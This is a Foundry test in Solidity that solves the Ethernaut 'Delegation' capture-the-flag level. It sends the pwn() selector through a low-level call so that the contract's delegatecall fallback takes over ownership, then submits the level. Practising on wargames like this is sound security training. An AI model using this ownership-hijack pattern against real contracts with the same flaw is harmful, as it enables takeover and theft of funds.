pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Delegation/DelegationFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract DelegationTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testDelegationHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        DelegationFactory delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
        Delegation ethernautDelegation = Delegation(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Determine method hash, required for function call
        bytes4 methodHash = bytes4(keccak256("pwn()"));

        // Call the pwn() method via .call plus abi encode the method hash switch from bytes4 to bytes memory
        address(ethernautDelegation).call(abi.encode(methodHash));


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}